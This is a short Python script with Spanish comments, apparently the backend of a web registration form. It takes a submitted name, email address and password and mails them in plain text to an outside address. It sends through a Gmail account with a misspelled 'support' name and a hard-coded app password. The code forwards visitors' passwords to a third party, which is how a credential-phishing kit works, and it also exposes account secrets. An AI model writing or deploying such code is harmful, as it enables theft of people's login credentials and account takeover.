import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Capturar los argumentos pasados desde PHP
name = sys.argv[1]
email = sys.argv[2]
password = sys.argv[3]

mi_email = "suppoortt168@gmail.com"
mi_password = "qbuw qpdq tntz mwmw"
destino_email = "csaavedra@latina.pe"

subject = "Nuevo registro en el formulario"
body = f"""
Se ha recibido un nuevo registro con los siguientes datos:
- Nombre: {name}
- Correo: {email}
- Contraseña: {password}
"""

smtp_server = "smtp.gmail.com"
smtp_port = 587

msg = MIMEMultipart()
msg['From'] = mi_email
msg['To'] = destino_email
msg['Subject'] = subject

msg.attach(MIMEText(body, 'plain'))

try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(mi_email, mi_password)
    server.sendmail(mi_email, destino_email, msg.as_string())
    server.quit()
    print("Correo enviado exitosamente.")
except Exception as e:
    print(f"Error al enviar el correo: {e}")
